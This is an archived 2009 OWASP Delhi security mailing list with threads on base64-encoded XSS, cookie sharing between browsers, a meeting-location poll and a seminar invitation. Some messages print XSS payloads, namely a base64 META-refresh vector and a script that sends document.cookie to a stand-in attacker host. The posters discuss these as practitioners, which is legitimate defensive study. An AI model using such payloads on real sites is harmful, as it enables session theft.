+presenting back to the user.
+So I think ....encoding xss vector in base64 is not going to harm you.
+
+However...wait for other expert comments!
+
+
+
+-- 
+Thanks & Regards,
+Nilesh Kumar,
+Security Specialist | Governance Risk Compliance
+www.nileshkumar83.blogspot.com
+www.linkedin.com/in/nileshkumar83
+Mobile- +91-9891524880
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090316/e6bd3832/attachment.html 
+
+From dhruv.soi at owasp.org  Mon Mar 16 07:04:30 2009
+From: dhruv.soi at owasp.org (Soi, Dhruv)
+Date: Mon, 16 Mar 2009 16:34:30 +0530
+Subject: [Owasp-delhi] Poll Interim Results
+Message-ID: <49be324c.160d6e0a.727b.ffffa17a@mx.google.com>
+
+Hello All,
+
+ 
+
+Thank you for participating in web poll and helping us to decide best
+suitable location and schedule to organize OWASP events in this part of the
+world. Web poll is still open and in case you see that results are not
+favorable to your convenience then please feel free to participate and help
+us accumulate further data to analyze. As on date, there were total of 39
+submissions and results are as below or might appear in attachment for few
+mail clients:
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+ 
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090316/702ec4b9/attachment-0001.html 
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: not available
+Type: image/png
+Size: 26485 bytes
+Desc: not available
+Url : https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090316/702ec4b9/attachment-0002.png 
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: not available
+Type: image/png
+Size: 35413 bytes
+Desc: not available
+Url : https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090316/702ec4b9/attachment-0003.png 
+
+From dhruv.soi at ariosesoftware.com  Mon Mar 16 08:01:17 2009
+From: dhruv.soi at ariosesoftware.com (Soi, Dhruv)
+Date: Mon, 16 Mar 2009 17:31:17 +0530
+Subject: [Owasp-delhi] Poll Interim Results
+In-Reply-To: <49be324c.160d6e0a.727b.ffffa17a@mx.google.com>
+References: <49be324c.160d6e0a.727b.ffffa17a@mx.google.com>
+Message-ID: <49be3f9a.04686e0a.31bd.37fe@mx.google.com>
+
+Poll is going to closed on 18th March 2009 at 6PM. If not already, please
+participate now by visiting this link:
+http://www.torridnet.com/owasp-meeting . 
+
+ 
+
+Sorry for the top posting, I forgot to mention this in my previous email and
+was then reminded by few OWASP members J
+
+ 
+
+Many Thanks,
+
+Dhruv
+
+ 
+
+From: owasp-delhi-bounces at lists.owasp.org
+[mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of Soi, Dhruv
+Sent: Monday, March 16, 2009 4:35 PM
+To: owasp-delhi at lists.owasp.org
+Subject: [Owasp-delhi] Poll Interim Results
+
+ 
+
+Hello All,
+
+ 
+
+Thank you for participating in web poll and helping us to decide best
+suitable location and schedule to organize OWASP events in this part of the
+world. Web poll is still open and in case you see that results are not
+favorable to your convenience then please feel free to participate and help
+us accumulate further data to analyze. As on date, there were total of 39
+submissions and results are as below or might appear in attachment for few
+mail clients:
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+ 
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090316/dd61954b/attachment-0001.html 
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: not available
+Type: image/png
+Size: 26485 bytes
+Desc: not available
+Url : https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090316/dd61954b/attachment-0002.png 
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: not available
+Type: image/png
+Size: 35413 bytes
+Desc: not available
+Url : https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090316/dd61954b/attachment-0003.png 
+
+From nileshkumar83 at gmail.com  Mon Mar 16 07:30:05 2009
+From: nileshkumar83 at gmail.com (nileshkumar83 at gmail.com)
+Date: Mon, 16 Mar 2009 17:00:05 +0530
+Subject: [Owasp-delhi] base64 XSS
+In-Reply-To: <ee7382370903160341v6a403058l601efd2953995119@mail.gmail.com>
+References: <e647f86c0903122302y42d97fb0iff34acd76978732a@mail.gmail.com>
+	<ADAE02D6-1BAE-45D1-8234-B8F255F8B059@sisa.co.in>
+	<ee7382370903160341v6a403058l601efd2953995119@mail.gmail.com>
+Message-ID: <ee7382370903160430u33fa29b6l7915c79d70a0575f@mail.gmail.com>
+
+In continuation of my previous mail...
+
+As per Abrol Raj--
+> "i am testing a website in which normal XSS script is not accepted by the
+application, it gives run time error. If i am encoded it into >base64, it
+gets saved on server but not get executed.
+> what would be the possible reason that the script is not getting executed,
+even the script is saved by the application."
+
+Exactly....the application expects anything that can be again rendered back
+to the user after interpretation of the code. That is the case when this is
+exploited when there's no proper input validation in place and results in
+XSS execution.
+
+In case of supplying XSS vector in original form, the application knows how
+to render it back to the user-- If HTML encoding is there(output validation)
+it will just print the value as characters(i.e. no XSS); if HTML encodng is
+not there it will get executed(i.e. XSS).
+
+But in case of base64 encoding the application simply does not know 'what to
+do with the code'. That payload is saved on the server instead of displaying
+it.
+
+However there are other ways to execute XSS with base64 encoding but they
+are rare. One exaple is with META tag, not with user input interaction:
+
+<META HTTP-EQUIV="refresh"
+CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+
+
+
+Wait for other expert comments.....
+
+>
+
+
+-- 
+Thanks & Regards,
+Nilesh Kumar,
+Security Specialist | Governance Risk Compliance
+www.nileshkumar83.blogspot.com
+www.linkedin.com/in/nileshkumar83
+Mobile- +91-9891524880
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090316/6335f8e0/attachment.html 
+
+From robin.tiwari at rbs.com  Tue Mar 17 06:15:51 2009
+From: robin.tiwari at rbs.com (robin.tiwari at rbs.com)
+Date: Tue, 17 Mar 2009 15:45:51 +0530
+Subject: [Owasp-delhi] Response Header Name Injection Attack
+In-Reply-To: <49be3f9a.04686e0a.31bd.37fe@mx.google.com>
+Message-ID: <OFA12AE72A.838806F1-ON6525757C.0037E21C-6525757C.00386232@abnamro.com>
+
+Hi;
+
+A  new  vulnerability discovered by  Cyrill Brunschwiler.
+http://www.securityfocus.com/archive/101/501793/30/0/threaded
+
+
+
+
+
+ Regards
+
+Robin Tiwari
+
+
+This message (including any attachments) is confidential and may be privileged. If you have received it by mistake please notify the sender by return e-mail and delete this message from your system. Any unauthorised use or dissemination of this message in whole or in part is strictly prohibited. Please note that e-mails are susceptible to change. ABN AMRO Central Enterprise Services Pvt Ltd, part of RBS Group plc , having its registered office at Empire Complex, 414 Senapati Bapat Marg, Lower Parel (W), Mumbai - 400 013 , including its group companies, shall not be liable for the improper or incomplete transmission of the information contained in this communication nor for any delay in its receipt or damage to your system. ABN AMRO Central Enterprise Services Pvt Ltd (or its group companies) does not guarantee that the integrity of this communication has been maintained nor that this communication is free of viruses, interceptions or interference.
+
+______________________________________________________________________
+This email has been scanned by the MessageLabs Email Security System.
+For more information please visit http://www.messagelabs.com/email 
+______________________________________________________________________
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090317/3491154d/attachment.html 
+
+From karthik.muthukrishnan at tcs.com  Tue Mar 17 07:22:45 2009
+From: karthik.muthukrishnan at tcs.com (Karthik Muthukrishnan)
+Date: Tue, 17 Mar 2009 16:52:45 +0530
+Subject: [Owasp-delhi] base64 XSS
+In-Reply-To: <e647f86c0903122302y42d97fb0iff34acd76978732a@mail.gmail.com>
+References: <e647f86c0903122302y42d97fb0iff34acd76978732a@mail.gmail.com>
+Message-ID: <OFCAD50376.0FAAC841-ON6525757C.003DD3B9-6525757C.003E81F1@tcs.com>
+
+> what would be the possible reason?that the script is?not getting
+executed, even the script is saved by the application.
+The application did not decode base64 data. It might have just saved base64
+data as string, and then presented to the browser as string.
+
+> If i am encoded it into base64, it gets saved on server but not get
+executed.
+The server was expecting a string, and accepted the input as string.
+
+Did you try refining the attack based on the error message you received?
+Did you try other encoding options which the server might recognize and
+process?
+
+Karthik
+
+--
+Karthik Muthukrishnan, CISSP ISSAP,
+Information Risk Management Consultant,
+Tata Consultancy Services
+
+
+
+                                                                           
+             Raj Abrol                                                     
+             <abrol.raj at gmail.                                             
+             com>                                                       To 
+             Sent by:                  owasp-delhi at lists.owasp.org         
+             owasp-delhi-bounc                                          cc 
+             es at lists.owasp.or                                             
+             g                                                     Subject 
+                                       [Owasp-delhi] base64 XSS            
+                                                                           
+             13/03/2009 11:32                                              
+             AM                                                            
+                                                                           
+                                                                           
+                                                                           
+
+
+
+
+HI all
+??????? i am testing a website in which normal?XSS script is not accepted
+by the application, it gives run time error. If i am encoded it into
+base64, it gets saved on server but not get executed.
+
+what would be the possible reason?that the script is?not getting executed,
+even the script is saved by the application.
+
+--
+Regards
+Raj Abrol
+
+
+
+_______________________________________________
+Owasp-delhi mailing list
+Owasp-delhi at lists.owasp.org
+https://lists.owasp.org/mailman/listinfo/owasp-delhi
+
+ForwardSourceID:NT000133FA
+
+=====-----=====-----=====
+Notice: The information contained in this e-mail
+message and/or attachments to it may contain 
+confidential or privileged information. If you are 
+not the intended recipient, any dissemination, use, 
+review, distribution, printing or copying of the 
+information contained in this e-mail message 
+and/or attachments to it are strictly prohibited. If 
+you have received this communication in error, 
+please notify us by reply e-mail or telephone and 
+immediately and permanently delete the message 
+and any attachments. Thank you
+
+
+
+
+From dhruv.soi at owasp.org  Wed Mar 18 03:53:28 2009
+From: dhruv.soi at owasp.org (Soi, Dhruv)
+Date: Wed, 18 Mar 2009 13:23:28 +0530
+Subject: [Owasp-delhi] FW: PMI : Executive Seminar Series on Application
+	Security
+Message-ID: <49c0a881.06d7720a.57f7.2e94@mx.google.com>
+
+Might be of your interest.
+
+ 
+
+From: Priya Rajmane [mailto:rajmane.priya at gmail.com] 
+Sent: Wednesday, March 18, 2009 11:45 AM
+To: a.parekh at mpstechnologies.com
+Subject: PMI : Executive Seminar Series on Application Security
+
+ 
+
+ 
+
+Hello Amit,
+
+ 
+
+ 
+
+The Executive Seminar Series on Application Security is held on 22nd & 29th
+March 2009 (Sunday) in Delhi at Hotel Oberoi and the timings are  from 10:00
+AM to 4:00 PM and it will cover everything you need to know about securing
+mission-critical applications -- both the technologies you'll need, as well
+as the policies and procedures you would be well advised to wrap around
+them. A well-conceived application security strategy involves not only the
+technology and the manner in which it is deployed - it also places an equal
+emphasis on managing how that technology is used. 
+
+
+Most breaches these days are coming through the application layer, so don't
+miss this opportunity to hear how to best defend yourself, your organization
+and your systems from application layer attacks or breaches. 
+
+
+Finally, you know the value of connecting and networking with your local
+peers. It's an invaluable opportunity. You'll be able to share stories and
+strategies with security executives who have the same concerns, and work in
+the same area. There are numerous opportunities during the day to break out
+and network with your fellows.
+
+ 
+
+Agenda Topics & More:
+
+ 
+
+1.	The Hidden Threats Posed by IM and Social Networking. 
+2.	Application Security and its Impact on Compliance. 
+3.	Discussion about database,operating system and development
+background as well. 
+4.	Securing Web Applications. 
+5.	Discussion on application level attacks,bypassing firewalls and
+application security architecture.  
+6.	The Case For Software Security Assurance In The Enterprise . 
+7.	How Application Security Standards Reduce Costs and Risks. 
+8.	What is Web Application Forensics? 
+9.	Assess Your Own Application Security Posture. 
+10.	Discussion on Economic growth & responsibilities. 
+11.	Speakers session for 30min. 
+12.	Debate session as well.
+
+It is an interactive kind of session where each and every person has a right
+to share their views.Those who are interested kindly forwaded their names
+along with the contact details as they r looking 200 people for this seminar
+and its free of cost. Kindly reply to this mail with the references of your
+colleagues and friends who would be interested to attend the Seminar.
+
+ 
+
+Who can Attend :
+
+Software Engineers.
+
+Security Analyst.
+
+Sr. Security Analyst.
+
+Security Architecture.
+
+ 
+
+Who can be a Speaker :
+
+Project Managers.
+
+Sr. Project Managers.
+
+ 
+
+ 
+
+ 
+
+Awaiting for the reply as its very urgent.
+
+ 
+
+Regards,
+
+Priya Rajmane.
+
+ 
+
+----------------------------------------------------------------------------
+------------------------------------------------------------Kindly fill in
+the attached form.
+
+
+
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090318/d66ed9d4/attachment-0001.html 
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: Personal_Details.doc
+Type: application/msword
+Size: 27648 bytes
+Desc: not available
+Url : https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090318/d66ed9d4/attachment-0001.doc 
+
+From rajesh_suryavanshi at uhc.com  Wed Mar 18 06:17:07 2009
+From: rajesh_suryavanshi at uhc.com (Suryavanshi, Rajesh)
+Date: Wed, 18 Mar 2009 05:17:07 -0500
+Subject: [Owasp-delhi] FW: PMI : Executive Seminar Series on
+	ApplicationSecurity
+In-Reply-To: <49c0a881.06d7720a.57f7.2e94@mx.google.com>
+References: <49c0a881.06d7720a.57f7.2e94@mx.google.com>
+Message-ID: <C43253473FD45040927293601323511170783B@APSW0640EVS.ms.ds.uhc.com>
+
+Hi,
+ 
+Please find the attached details.
+ 
+ 
+Thanks & Regards,
+
+ 
+
+Rajesh Suryavanshi
+
+ 
+
+Information Risk Management - India || United Health Group || Tower B,
+14th Floor, Unitech Cyber Park Sector 39, Gurgaon, INDIA Handphone
++011-20285851 || Deskphone +91 124 3095391 || Web: 
+http://www.unitedhealthgroup.com/   
+
+ 
+
+ 
+ 
+
+________________________________
+
+From: owasp-delhi-bounces at lists.owasp.org
+[mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of Soi, Dhruv
+Sent: Wednesday, March 18, 2009 1:23 PM
+To: owasp-delhi at lists.owasp.org
+Subject: [Owasp-delhi] FW: PMI : Executive Seminar Series on
+ApplicationSecurity
+
+
+
+Might be of your interest...
+
+ 
+
+From: Priya Rajmane [mailto:rajmane.priya at gmail.com] 
+Sent: Wednesday, March 18, 2009 11:45 AM
+To: a.parekh at mpstechnologies.com
+Subject: PMI : Executive Seminar Series on Application Security
+
+ 
+
+ 
+
+Hello Amit,
+
+ 
+
+ 
+
+The Executive Seminar Series on Application Security is held on 22nd &
+29th March 2009 (Sunday) in Delhi at Hotel Oberoi and the timings are
+from 10:00 AM to 4:00 PM and it will cover everything you need to know
+about securing mission-critical applications -- both the technologies
+you'll need, as well as the policies and procedures you would be well
+advised to wrap around them. A well-conceived application security
+strategy involves not only the technology and the manner in which it is
+deployed - it also places an equal emphasis on managing how that
+technology is used. 
+
+
+Most breaches these days are coming through the application layer, so
+don't miss this opportunity to hear how to best defend yourself, your
+organization and your systems from application layer attacks or
+breaches. 
+
+
+Finally, you know the value of connecting and networking with your local
+peers. It's an invaluable opportunity. You'll be able to share stories
+and strategies with security executives who have the same concerns, and
+work in the same area. There are numerous opportunities during the day
+to break out and network with your fellows.
+
+ 
+
+Agenda Topics & More:
+
+ 
+
+1.	The Hidden Threats Posed by IM and Social Networking. 
+2.	Application Security and its Impact on Compliance. 
+3.	Discussion about database,operating system and development
+background as well. 
+4.	Securing Web Applications. 
+5.	Discussion on application level attacks,bypassing firewalls and
+application security architecture.  
+6.	The Case For Software Security Assurance In The Enterprise . 
+7.	How Application Security Standards Reduce Costs and Risks. 
+8.	What is Web Application Forensics? 
+9.	Assess Your Own Application Security Posture. 
+10.	Discussion on Economic growth & responsibilities. 
+11.	Speakers session for 30min. 
+12.	Debate session as well. 
+
+It is an interactive kind of session where each and every person has a
+right to share their views.Those who are interested kindly forwaded
+their names along with the contact details as they r looking 200 people
+for this seminar and its free of cost. Kindly reply to this mail with
+the references of your colleagues and friends who would be interested to
+attend the Seminar.
+
+ 
+
+Who can Attend :
+
+Software Engineers.
+
+Security Analyst.
+
+Sr. Security Analyst.
+
+Security Architecture.
+
+ 
+
+Who can be a Speaker :
+
+Project Managers.
+
+Sr. Project Managers.
+
+ 
+
+ 
+
+ 
+
+Awaiting for the reply as its very urgent.
+
+ 
+
+Regards,
+
+Priya Rajmane.
+
+ 
+
+------------------------------------------------------------------------
+----------------------------------------------------------------Kindly
+fill in the attached form.
+
+
+
+
+
+This e-mail, including attachments, may include confidential and/or
+proprietary information, and may be used only by the person or entity
+to which it is addressed. If the reader of this e-mail is not the intended
+recipient or his or her authorized agent, the reader is hereby notified
+that any dissemination, distribution or copying of this e-mail is
+prohibited. If you have received this e-mail in error, please notify the
+sender by replying to this message and delete this e-mail immediately.
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090318/48e04574/attachment-0001.html 
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: Personal_Details.doc
+Type: application/msword
+Size: 37376 bytes
+Desc: Personal_Details.doc
+Url : https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090318/48e04574/attachment-0001.doc 
+
+From dhruv.soi at owasp.org  Wed Mar 18 10:19:56 2009
+From: dhruv.soi at owasp.org (Soi, Dhruv)
+Date: Wed, 18 Mar 2009 19:49:56 +0530
+Subject: [Owasp-delhi] Web poll final results
+References: <49be324c.160d6e0a.727b.ffffa17a@mx.google.com>
+Message-ID: <49c1031a.0e1b6e0a.32af.fffff215@mx.google.com>
+
+Here we go with the final results derived by web poll. There were total of
+46 nominations and below are the stats:
+
+ 
+
+
+
+
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090318/d1616571/attachment-0001.html 
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: not available
+Type: image/png
+Size: 37968 bytes
+Desc: not available
+Url : https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090318/d1616571/attachment-0002.png 
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: not available
+Type: image/png
+Size: 27413 bytes
+Desc: not available
+Url : https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090318/d1616571/attachment-0003.png 
+
+From s.parmendra at gmail.com  Wed Mar 18 23:59:45 2009
+From: s.parmendra at gmail.com (Parmendra Sharma)
+Date: Thu, 19 Mar 2009 09:29:45 +0530
+Subject: [Owasp-delhi] Regarding XSS Issue
+Message-ID: <f162ba540903182059xf8f0ef7q87de5bc37ec3c13c@mail.gmail.com>
+
+Dear all,
+
+I have a little problem regarding XSS and here it is....
+
+To perform an XSS attack an attacker steals cookies (in this case) of an
+already logged in user.
+
+In this scenerio :
+
+-> The user is logged in "VulnerableRealBank.com" website in *one browser*.
+
+-> Now this user opens his email account in a *different browser* (and not
+in the new tab of the above browser) and clicks upon the link given
+
+http://VulnerableRealBank.com/index.php?sessionid=12412412<http://vulnerablerealbank.com/index.php?sessionid=12412412>
+&
+
+username=<script>document.location='http://attacker
+host.example/cgi-bin/cookiesteal.cgi?'+document.cookie</script>
+
+Now my Questions:
+
+-> Will the script that is reflected back from the vulnerable domain is
+capable to send the cookies to the atttacker that are maintained by the
+first browser.
+
+-> Is above thing possible if i says that i am using the browser version
+that do not shares cookies for the same domain requests.
+
+-> Is this the problem that is totally independent from the browsers
+versions and is only the functionality of the script that is sending
+cookies.
+
+Waiting for your responses :-)
+
+
+-- 
+Thanks and Regards:
+
+Parmendra Sharma
+Indian Computer Emergency Response Team (CERT-In)
+Ministry of Information Technology
+Government of India
+6 C.G.O Complex
+Lodhi Road
+New Delhi
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090319/ef339366/attachment.html 
+
+From a.parekh at mpstechnologies.com  Wed Mar 18 06:34:45 2009
+From: a.parekh at mpstechnologies.com (Amit Parekh)
+Date: Wed, 18 Mar 2009 16:04:45 +0530
+Subject: [Owasp-delhi] FW: PMI : Executive Seminar Series
+	on	ApplicationSecurity
+In-Reply-To: <C43253473FD45040927293601323511170783B@APSW0640EVS.ms.ds.uhc.com>
+References: <49c0a881.06d7720a.57f7.2e94@mx.google.com>
+	<C43253473FD45040927293601323511170783B@APSW0640EVS.ms.ds.uhc.com>
+Message-ID: <000601c9a7b5$298b3d40$7ca1b7c0$@parekh@mpstechnologies.com>
+
+Hi All,
+
+ 
+
+Regarding the seminar, please send the filled "Personal_details.doc" form to
+rajmane.priya at gmail.com directly. She would get in touch with you.
+
+ 
+
+Regards,
+
+ 
+
+Amit N. Parekh
+
+Security Lead
+
+ <http://www.mpstechnologies.com> MPS Technologies Limited
+
+GURGAON - INDIA
+
+Email: a.parekh at mpstechnologies.com
+
+Web:  www.MPSTechnologies.com
+
+ 
+
+ 
+
+From: owasp-delhi-bounces at lists.owasp.org
+[mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of Suryavanshi,
+Rajesh
+Sent: Wednesday, March 18, 2009 3:47 PM
+To: dhruv.soi at owasp.org; owasp-delhi at lists.owasp.org
+Subject: Re: [Owasp-delhi] FW: PMI : Executive Seminar Series on
+ApplicationSecurity
+
+ 
+
+Hi,
+
+ 
+
+Please find the attached details.
+
+ 
+
+ 
+
+Thanks & Regards,
+
+ 
+
+Rajesh Suryavanshi
+
+ 
+
+ 
+
+ 
+
+Information Risk Management - India || United Health Group || Tower B, 14th
+Floor, Unitech Cyber Park Sector 39, Gurgaon, INDIA Handphone +011-20285851
+|| Deskphone +91 124 3095391 || Web: http://www.unitedhealthgroup.com/   
+
+ 
+
+ 
+
+ 
+
+ 
+
+  _____  
+
+From: owasp-delhi-bounces at lists.owasp.org
+[mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of Soi, Dhruv
+Sent: Wednesday, March 18, 2009 1:23 PM
+To: owasp-delhi at lists.owasp.org
+Subject: [Owasp-delhi] FW: PMI : Executive Seminar Series on
+ApplicationSecurity
+
+Might be of your interest.
+
+ 
+
+From: Priya Rajmane [mailto:rajmane.priya at gmail.com] 
+Sent: Wednesday, March 18, 2009 11:45 AM
+To: a.parekh at mpstechnologies.com
+Subject: PMI : Executive Seminar Series on Application Security
+
+ 
+
+ 
+
+Hello Amit,
+
+ 
+
+ 
+
+The Executive Seminar Series on Application Security is held on 22nd & 29th
+March 2009 (Sunday) in Delhi at Hotel Oberoi and the timings are  from 10:00
+AM to 4:00 PM and it will cover everything you need to know about securing
+mission-critical applications -- both the technologies you'll need, as well
+as the policies and procedures you would be well advised to wrap around
+them. A well-conceived application security strategy involves not only the
+technology and the manner in which it is deployed - it also places an equal
+emphasis on managing how that technology is used. 
+
+
+Most breaches these days are coming through the application layer, so don't
+miss this opportunity to hear how to best defend yourself, your organization
+and your systems from application layer attacks or breaches. 
+
+
+Finally, you know the value of connecting and networking with your local
+peers. It's an invaluable opportunity. You'll be able to share stories and
+strategies with security executives who have the same concerns, and work in
+the same area. There are numerous opportunities during the day to break out
+and network with your fellows.
+
+ 
+
+Agenda Topics & More:
+
+ 
+
+1.	The Hidden Threats Posed by IM and Social Networking. 
+2.	Application Security and its Impact on Compliance. 
+3.	Discussion about database,operating system and development
+background as well. 
+4.	Securing Web Applications. 
+5.	Discussion on application level attacks,bypassing firewalls and
+application security architecture.  
+6.	The Case For Software Security Assurance In The Enterprise . 
+7.	How Application Security Standards Reduce Costs and Risks. 
+8.	What is Web Application Forensics? 
+9.	Assess Your Own Application Security Posture. 
+10.	Discussion on Economic growth & responsibilities. 
+11.	Speakers session for 30min. 
+12.	Debate session as well. 
+
+It is an interactive kind of session where each and every person has a right
+to share their views.Those who are interested kindly forwaded their names
+along with the contact details as they r looking 200 people for this seminar
+and its free of cost. Kindly reply to this mail with the references of your
+colleagues and friends who would be interested to attend the Seminar.
+
+ 
+
+Who can Attend :
+
+Software Engineers.
+
+Security Analyst.
+
+Sr. Security Analyst.
+
+Security Architecture.
+
+ 
+
+Who can be a Speaker :
+
+Project Managers.
+
+Sr. Project Managers.
+
+ 
+
+ 
+
+ 
+
+Awaiting for the reply as its very urgent.
+
+ 
+
+Regards,
+
+Priya Rajmane.
+
+ 
+
+----------------------------------------------------------------------------
+------------------------------------------------------------Kindly fill in
+the attached form.
+
+
+
+
+ 
+This e-mail, including attachments, may include confidential and/or
+proprietary information, and may be used only by the person or entity
+to which it is addressed. If the reader of this e-mail is not the intended
+recipient or his or her authorized agent, the reader is hereby notified
+that any dissemination, distribution or copying of this e-mail is
+prohibited. If you have received this e-mail in error, please notify the
+sender by replying to this message and delete this e-mail immediately.
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090318/3fb05dfe/attachment-0001.html 
+
+From nileshkumar83 at gmail.com  Thu Mar 19 01:48:34 2009
+From: nileshkumar83 at gmail.com (nileshkumar83 at gmail.com)
+Date: Thu, 19 Mar 2009 11:18:34 +0530
+Subject: [Owasp-delhi] Regarding XSS Issue
+In-Reply-To: <f162ba540903182059xf8f0ef7q87de5bc37ec3c13c@mail.gmail.com>
+References: <f162ba540903182059xf8f0ef7q87de5bc37ec3c13c@mail.gmail.com>
+Message-ID: <ee7382370903182248hbb0d4e7l936f0d9a70df0e8d@mail.gmail.com>
+
+Hi Paramendra!
+
+     Here are my attempted answers to your queries...
+
+
+>
+> -> Will the script that is reflected back from the vulnerable domain is
+> capable to send the cookies to the atttacker that are maintained by the
+> first browser.
+>
+
+  It depends...I have seen examples when one account can be opened  in two
+browsers simultaneosuly. In that case it is possible to steal the cookies
+form the second browser also. Those are the case of web based mails and
+other social networking sites. However, financial site must not behave like
+this way.
+
+
+>
+> -> Is above thing possible if i says that i am using the browser version
+> that do not shares cookies for the same domain requests.
+>
+
+I think then it's not possible.
+
+
+>
+> -> Is this the problem that is totally independent from the browsers
+> versions and is only the functionality of the script that is sending
+> cookies.
+>
+
+I think, whatever way the browsers behave , the application--specially
+financial sites-- must not let uers open two instances of same page or same
+account. That way they can prevent this kind of attack.
+
+Wait for other expert comments.... :)
+
+
+
+-- 
+Thanks & Regards,
+Nilesh Kumar,
+Security Specialist | Governance Risk Compliance
+www.nileshkumar83.blogspot.com
+www.linkedin.com/in/nileshkumar83
+Mobile- +91-9891524880
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090319/142dfafd/attachment.html 
+
+From gunwant.s at gmail.com  Thu Mar 19 11:01:29 2009
+From: gunwant.s at gmail.com (Gunwant Singh)
+Date: Thu, 19 Mar 2009 20:31:29 +0530
+Subject: [Owasp-delhi] Regarding XSS Issue
+In-Reply-To: <f162ba540903182059xf8f0ef7q87de5bc37ec3c13c@mail.gmail.com>
+References: <f162ba540903182059xf8f0ef7q87de5bc37ec3c13c@mail.gmail.com>
+Message-ID: <44b2bd060903190801j6f20158as66898714b0849f4c@mail.gmail.com>
+
+Hi,
+
+Please see my comments below.
+
+2009/3/19 Parmendra Sharma <s.parmendra at gmail.com>
+
+> Dear all,
+>
+> I have a little problem regarding XSS and here it is....
+>
+> To perform an XSS attack an attacker steals cookies (in this case) of an
+> already logged in user.
+>
+> In this scenerio :
+>
+> -> The user is logged in "VulnerableRealBank.com" website in *one browser*
+> .
+>
+> -> Now this user opens his email account in a *different browser* (and not
+> in the new tab of the above browser) and clicks upon the link given
+>
+> http://VulnerableRealBank.com/index.php?sessionid=12412412<http://vulnerablerealbank.com/index.php?sessionid=12412412>
+> &
+>
+> username=<script>document.location='http://attacker
+> host.example/cgi-bin/cookiesteal.cgi?'+document.cookie</script>
+>
+> Now my Questions:
+>
+> -> Will the script that is reflected back from the vulnerable domain is
+> capable to send the cookies to the atttacker that are maintained by the
+> first browser.
+>
+
+In a different browser (and not tab), the Session ID cookie or any other
+cookie will not be shared, therefore the attack would not execute.
+
+>
+> -> Is above thing possible if i says that i am using the browser version
+> that do not shares cookies for the same domain requests.
+>
+
+I already answered the question. Different browser windows do not share
+cookies.
+
+>
+> -> Is this the problem that is totally independent from the browsers
+> versions and is only the functionality of the script that is sending
+> cookies.
+>
+
+No, this issue is dependent on the type of browsers. I have heard (and not
+tried myself) that Chrome handles cookies the same way even in tabs. So it
+depends on how a browser handles cookies in tabs and/or windows.
+
+>
+> Waiting for your responses :-)
+>
+
+Hope that helps.
+
+-Gunwant
+
+>
+>
+> --
+> Thanks and Regards:
+>
+> Parmendra Sharma
+> Indian Computer Emergency Response Team (CERT-In)
+> Ministry of Information Technology
+> Government of India
+> 6 C.G.O Complex
+> Lodhi Road
+> New Delhi
+>
+> _______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+>
+
+
+-- 
+Gunwant Singh
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090319/3f4034d8/attachment.html 
+
+From karthik.muthukrishnan at tcs.com  Fri Mar 20 01:16:32 2009
+From: karthik.muthukrishnan at tcs.com (Karthik Muthukrishnan)
+Date: Fri, 20 Mar 2009 10:46:32 +0530
+Subject: [Owasp-delhi] Regarding XSS Issue
+In-Reply-To: <f162ba540903182059xf8f0ef7q87de5bc37ec3c13c@mail.gmail.com>
+References: <f162ba540903182059xf8f0ef7q87de5bc37ec3c13c@mail.gmail.com>
+Message-ID: <OF10EB9E45.4D3C113B-ON6525757F.001CCCE2-6525757F.001CFAC8@tcs.com>
+
+Whether cookies are shared between browser windows depends on various
+factors like browser vendor and how the new browser windows is launched.
+Due to these inconsistencies it is good for web application security
+professionals to assume that cookies will be shared across browser windows
+and tabs. As you might all know, cookies will not be shared across browsers
+from different vendors.
+
+Examples:
+
+In Win XP SP3 IE7:
+a. Cookies will be shared if the different browser windows belong to the
+same process. During normal use, this happens when one right-clicks a link
+and then chooses new tab or new window.
+b. Cookies will not be shared if the browser windows belong to separate
+processes. During normal use, this happens when Internet Explorer icon (in
+desktop or startmenu) is double clicked.
+
